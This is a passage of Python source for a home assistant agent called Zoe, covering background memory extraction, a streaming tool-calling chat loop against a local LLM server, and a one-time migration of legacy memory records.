    if any(lower.startswith(prefix) for prefix in _MEM_SKIP_PREFIXES):
        return []

    out: list[str] = []
    seen: set[str] = set()
    for pattern, template in _MEM_EXTRACT_PATTERNS:
        m = re.search(pattern, msg, flags=re.IGNORECASE)
        if not m:
            continue
        groups = tuple((g or "").strip() for g in m.groups())
        if not any(groups):
            continue
        try:
            text = template.format(*groups).strip()
        except Exception:
            continue
        if len(text) < 8:
            continue
        key = text.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(text)
    return out


def _fast_memory_extract(user_msg: str, _assistant_reply: str = "") -> list[str]:
    """Back-compat shim over the unified ``memory_extractor``.

    Still returns the same ``list[str]`` contract so older callers and tests
    don't need to change. The pattern set used to live here; it now lives
    in ``memory_extractor._TEMPLATE_PATTERNS`` alongside the classifier
    rules the chat router used to own.
    """
    try:
        from memory_extractor import extract_candidates

        return [c.text for c in extract_candidates(user_msg, _assistant_reply)]
    except Exception as exc:
        logger.warning("memory_extractor unavailable, using legacy fallback: %s", exc)
        return _legacy_memory_extract(user_msg)


async def _background_memory_save(
    user_msg: str, assistant_reply: str, user_id: str = "guest"
) -> None:
    """Shim for legacy tests and call sites.

    Delegates to the unified ``memory_extractor.extract_and_ingest``, which
    runs through ``MemoryService`` (PII scrub, idempotency, audit log). The
    prior hand-rolled dedup via MemPalace search has been replaced by the
    idempotency-key check inside ``MemoryService.ingest``.
    """
    try:
        from memory_extractor import extract_and_ingest

        await extract_and_ingest(
            user_msg,
            assistant_reply,
            user_id=user_id,
            source="chat_regex",
            auto_approve=True,
        )
    except Exception as exc:
        logger.warning("background_memory_save: extractor unavailable, using legacy ingest fallback (%s)", exc)
        try:
            from memory_service import get_memory_service
            svc = get_memory_service()
            candidates = _legacy_memory_extract(user_msg)
            for idx, text in enumerate(candidates):
                turn_id = hashlib.sha1(user_msg.encode("utf-8", "ignore")).hexdigest()[:16]
                await svc.ingest(
                    text,
                    user_id=user_id,
                    source="chat_regex_fallback",
                    user_turn_id=f"{turn_id}-{idx}",
                    memory_type="fact",
                    confidence=0.68,
                    status="approved",
                    tags=["conversation", "legacy_fallback"],
                )
        except Exception as fallback_exc:
            logger.debug("background_memory_save fallback failed: %s", fallback_exc)


def _fire_memory_capture(
    user_msg: str, assistant_reply: str, user_id: str = "guest"
) -> None:
    """Schedule rule-based memory extraction as a background task (non-blocking, zero GPU)."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(_background_memory_save(user_msg, assistant_reply, user_id))
    except Exception:
        pass


# ── Streaming version for SSE chat endpoint ───────────────────────────────────

async def run_zoe_agent_streaming(
    message: str,
    session_id: str,
    user_id: str = "guest",
    *,
    history: list[dict] | None = None,
    db_memory_context: str | None = None,
    portrait: str | None = None,
    on_tool_start: "asyncio.coroutines.Coroutine | None" = None,
    on_tool_end: "asyncio.coroutines.Coroutine | None" = None,
    on_heartbeat: "asyncio.coroutines.Coroutine | None" = None,
    voice_mode: bool = False,
) -> AsyncIterator[str]:
    """
    Streaming variant — yields text chunks and dispatches callbacks for SSE.

    Yields:
        Text delta strings as the model generates them.
    Callbacks (all optional, called as coroutines):
        on_tool_start(tool_name, args) — before tool execution
        on_tool_end(tool_name, result) — after tool execution
        on_heartbeat(elapsed_s)        — every ~4s while waiting
    """
    # Fast path — instant replies for time/date/status, no LLM needed
    fast = _check_fast_response(message)
    if fast:
        logger.info("zoe_agent streaming: fast-path hit for session=%s", session_id)
        yield fast
        return
    if voice_mode:
        recovered = await _voice_capability_shortcut(message, user_id)
        if recovered:
            logger.info("zoe_agent streaming: capability shortcut hit session=%s", session_id)
            yield recovered
            return
    else:
        chat_recovered = await _chat_capability_shortcut(message, user_id)
        if chat_recovered:
            logger.info("zoe_agent streaming: chat shortcut hit session=%s", session_id)
            yield chat_recovered
            return

    t0 = time.monotonic()
    logger.info("zoe_agent streaming: session=%s jetson=%s voice=%s", session_id, _JETSON_MODE, voice_mode)

    # Load portrait (synthesized narrative understanding of the user)
    user_portrait = portrait if portrait is not None else await _load_user_portrait(user_id)

    # Load user facts, memory context, open loops, and context enhancement in parallel
    mp_facts, memory_ctx, user_open_loops, pending_offers, enhance_ctx = await asyncio.gather(
        _mempalace_load_user_facts(user_id),
        _build_memory_context(message, user_id=user_id),
        _load_open_loops(user_id),
        _load_pending_suggestions(user_id, session_id),
        _context_enhance(message, user_portrait, user_id),
    )
    memory_combined = "\n\n".join(filter(None, [mp_facts, db_memory_context, memory_ctx, enhance_ctx]))

    if voice_mode:
        # Voice: portrait goes into extras alongside memory (system prompt, no history window).
        extras = "\n\n".join(filter(None, [user_portrait, mp_facts, db_memory_context, memory_ctx, pending_offers]))
        system_prompt = (
            f"{_zoe_soul(user_id=user_id, voice_mode=True)}\n\n{extras}"
            if extras else _zoe_soul(user_id=user_id, voice_mode=True)
        )
        active_tools = _build_voice_tools(_voice_needs_tools(message))
        user_message = message
        _first_turn_choice = "auto"
    else:
        # Chat: stable system prompt (KV-cache friendly) + dynamic context in user prefix.
        # Portrait and memory go into the user message prefix via _build_prompt.
        system_prompt = _ZOE_SOUL_STATIC
        skills = _select_skills(message)
        active_tools = _build_tools(skills)
        # Creative writing: strip all tools so the model generates directly
        # without reaching for web_search or show_action_menu (3B model reliably
        # mis-triggers both for poems, haikus, stories, etc.).
        if _CREATIVE_WRITING_RE.search(message):
            active_tools = []
            logger.info("zoe_agent streaming: creative_writing detected — tools suppressed")
        user_message = _build_prompt(
            message,
            user_id=user_id,
            portrait=user_portrait,
            memory_context=memory_combined,
            open_loops=user_open_loops,
            pending_suggestions=pending_offers,
        )
        logger.info(
            "zoe_agent streaming: skills=%s tools=%d/%d portrait=%d open_loops=%d",
            sorted(skills), len(active_tools), len(_TOOLS), len(user_portrait), len(user_open_loops),
        )
        # Force tool call on iteration 0 when a real skill matched and tool list is small.
        _first_turn_choice = (
            "required"
            if (skills - {"discovery"} and len(active_tools) <= 6 and active_tools)
            else "auto"
        )

    messages: list[dict] = [{"role": "system", "content": system_prompt}]
    if history:
        _sys_tokens = len(system_prompt) // 4 + len(user_message) // 4 + 50
        _remaining = int(os.environ.get("ZOE_CONTEXT_TOKEN_BUDGET", "5500")) - _sys_tokens
        trimmed_hist: list[dict] = []
        for msg in reversed(history[-12:]):
            _msg_tokens = len(str(msg.get("content") or "")) // 4 + 10
            if _remaining - _msg_tokens < 0:
                logger.info(
                    "zoe_agent streaming: context compaction — dropped %d/%d history messages",
                    len(history[-12:]) - len(trimmed_hist), len(history[-12:]),
                )
                break
            trimmed_hist.insert(0, msg)
            _remaining -= _msg_tokens
        messages.extend(trimmed_hist)
    messages.append({"role": "user", "content": user_message})

    url = f"{_model_url()}/chat/completions"
    token_budget = _voice_token_budget() if voice_mode else _token_budget(message)

    def _make_payload(msgs: list[dict], tool_choice: str = "auto") -> dict:
        return {
            "model": _model_name(),
            "messages": msgs,
            "max_tokens": token_budget,
            "temperature": 0.6,
            "stream": True,
            "tools": active_tools,
            "tool_choice": tool_choice,
            "thinking_budget": 0,
        }

    payload = _make_payload(messages, tool_choice=_first_turn_choice)

    _max_iters = _VOICE_MAX_TOOL_ITERS if voice_mode else _MAX_TOOL_ITERS
    _seen_tool_calls: set[tuple[str, str]] = set()  # (tool_name, args_json) dedup
    for iteration in range(_max_iters + 1):
        collected = ""
        # Accumulate streaming tool_calls deltas (function name + arguments)
        streaming_tool_name: str | None = None
        streaming_tool_args_buf = ""

        try:
            async with httpx.AsyncClient(timeout=_llm_timeout_s(voice_mode=voice_mode)) as client:
                async with client.stream("POST", url, json=payload) as resp:
                    resp.raise_for_status()
                    last_hb = time.monotonic()
                    async for line in resp.aiter_lines():
                        if not line.startswith("data: "):
                            continue
                        data_str = line[6:]
                        if data_str.strip() == "[DONE]":
                            break
                        try:
                            chunk = json.loads(data_str)
                            delta = chunk["choices"][0]["delta"]

                            # Regular text content — yield immediately, no buffering needed
                            text_delta = delta.get("content") or ""
                            if text_delta:
                                collected += text_delta
                                yield text_delta

                            # Tool call delta — accumulate silently, nothing reaches the user
                            tc_deltas = delta.get("tool_calls") or []
                            for tc in tc_deltas:
                                fn = tc.get("function", {})
                                if fn.get("name"):
                                    streaming_tool_name = fn["name"]
                                streaming_tool_args_buf += fn.get("arguments", "")

                        except (json.JSONDecodeError, KeyError):
                            pass

                        now = time.monotonic()
                        if on_heartbeat and (now - last_hb) >= 4.0:
                            last_hb = now
                            try:
                                await on_heartbeat(int(now - t0))
                            except Exception:
                                pass

        except httpx.ConnectError:
            yield "\n[Zoe Agent: Gemma server offline — please check gemma-server / llama-server]"
            return
        except Exception as exc:
            logger.exception("zoe_agent streaming: LLM error iter=%d: %s", iteration, exc)
            yield f"\n[Error: {exc}]"
            return

        # Tool call came through the API channel — parse and dispatch
        tool_name = streaming_tool_name
        tool_args: dict | None = None
        _tool_args_parse_error = False
        if tool_name:
            raw_streaming_args = streaming_tool_args_buf or "{}"
            try:
                tool_args = json.loads(raw_streaming_args)
            except json.JSONDecodeError:
                tool_args = {}
                _tool_args_parse_error = True

        if tool_name and iteration < _max_iters:
            # Deduplicate identical tool+(args) calls to prevent oscillation and
            # duplicate side effects on non-idempotent tools (HA, reminders).
            _dedup_key = (tool_name, json.dumps(tool_args, sort_keys=True))
            if _dedup_key in _seen_tool_calls:
                logger.warning(
                    "zoe_agent streaming: skipping duplicate tool call iter=%d tool=%s",
                    iteration, tool_name,
                )
                messages.append({"role": "tool", "tool_call_id": f"call_{iteration}",
                                  "content": json.dumps({"note": "duplicate call skipped"})})
                payload = _make_payload(messages, tool_choice="auto")
                continue
            _seen_tool_calls.add(_dedup_key)

            # Propagate parse errors back to the model instead of running with empty args
            if _tool_args_parse_error:
                logger.warning(
                    "zoe_agent streaming: iter=%d tool=%s args parse error, raw=%r",
                    iteration, tool_name, raw_streaming_args[:200],
                )
                messages.append({
                    "role": "assistant", "content": collected or None,
                    "tool_calls": [{"id": f"call_{iteration}", "type": "function",
                                    "function": {"name": tool_name, "arguments": raw_streaming_args}}],
                })
                messages.append({
                    "role": "tool", "tool_call_id": f"call_{iteration}",
                    "content": json.dumps({
                        "error": f"Invalid JSON arguments for '{tool_name}' — please retry with valid JSON.",
                        "raw_received": raw_streaming_args[:200],
                    }),
                })
                payload = _make_payload(messages, tool_choice="auto")
                continue

            if on_tool_start:
                try:
                    await on_tool_start(tool_name, tool_args or {})
                except Exception:
                    pass

            # Yield start markers so chat.py can stream an immediate status line
            # to the user before the tool's delay becomes noticeable.
            if tool_name == "web_search":
                _sq = (tool_args or {}).get("query", "")
                yield f"__SEARCH_START__:{_sq}"
            elif tool_name == "deep_web_research":
                _dq = (tool_args or {}).get("query", "")
                yield f"__DEEP_RESEARCH_START__:{_dq}"

            # Emit a lightweight thinking marker so chat.py can surface tool activity
            yield f"__THINKING__:{tool_name}"

            logger.info("zoe_agent streaming: iter=%d tool=%s args=%s",
                        iteration, tool_name, json.dumps(tool_args)[:120])
            tool_result = await _dispatch_tool(tool_name, tool_args or {}, user_id=user_id)

            # Escalation signal — yield marker and stop; chat.py handles routing.
            if tool_result.startswith(("__ESCALATE__:", "__ESCALATE_BG__:", "__ESCALATE_HERMES__:")):
                logger.info("zoe_agent streaming: escalation triggered — %s", tool_result[:80])
                _fire_memory_capture(message, collected, user_id=user_id)
                yield tool_result
                return

            # UI component — yield marker so chat.py can emit zoe.ui_component event;
            # fall through to append tool messages and let the model produce follow-up text
            if tool_result.startswith("__UI__:"):
                logger.info("zoe_agent streaming: UI component — %s", tool_result[7:60])
                yield tool_result

            if on_tool_end:
                try:
                    await on_tool_end(tool_name, tool_result)
                except Exception:
                    pass

            # Append in OpenAI tool_calls format so context stays consistent
            messages.append({
                "role": "assistant",
                "content": collected or None,
                "tool_calls": [{"id": f"call_{iteration}", "type": "function",
                                "function": {"name": tool_name,
                                             "arguments": json.dumps(tool_args or {})}}],
            })
            messages.append({
                "role": "tool",
                "tool_call_id": f"call_{iteration}",
                "content": _cap_tool_result(tool_name, tool_result),
            })
            # Subsequent iterations always use "auto" — model should now produce text
            payload = _make_payload(messages, tool_choice="auto")
        else:
            # Done — no tool call in this iteration
            elapsed = time.monotonic() - t0
            logger.info(
                "zoe_agent streaming done: session=%s iters=%d elapsed=%.1fs",
                session_id, iteration, elapsed,
            )
            _fire_memory_capture(message, collected, user_id=user_id)
            return


# ── One-time MemPalace legacy migration ──────────────────────────────────────

_MIGRATION_DONE_FLAG = os.path.join(
    os.environ.get("MEMPALACE_DATA_DIR", os.path.expanduser("~/.mempalace")),
    ".migration_v1_done",
)


def migrate_mempalace_legacy_records(default_user_id: str = "family-admin") -> None:
    """One-time migration: re-tag legacy records (wing='zoe') to wing=default_user_id.

    Also stamps added_at on any records missing it.
    Safe to call at startup — exits immediately if already done.
    """
    if os.path.exists(_MIGRATION_DONE_FLAG):
        return
    try:
        import datetime
        from mempalace.palace import get_collection  # type: ignore[import]
        col = get_collection(_MEMPALACE_DATA)
        old = col.get(where={"wing": "zoe"}, include=["documents", "metadatas"])
        ids = old.get("ids") or []
        docs = old.get("documents") or []
        metas = old.get("metadatas") or []
        if ids:
            now_iso = datetime.datetime.now().isoformat()
            updated_metas = []
            for m in metas:
                m = dict(m)
                m["wing"] = default_user_id
                if "added_at" not in m:
                    m["added_at"] = now_iso
                updated_metas.append(m)
            col.upsert(ids=ids, documents=docs, metadatas=updated_metas)
            logger.info("mempalace: migrated %d legacy records → wing=%s", len(ids), default_user_id)
        # Mark done
        os.makedirs(os.path.dirname(_MIGRATION_DONE_FLAG), exist_ok=True)
        with open(_MIGRATION_DONE_FLAG, "w") as f:
            f.write(f"migrated {len(ids)} records\n")
    except ImportError:
        pass  # MemPalace not installed — nothing to migrate
    except Exception as exc:
        logger.warning("mempalace migration failed (non-fatal): %s", exc)
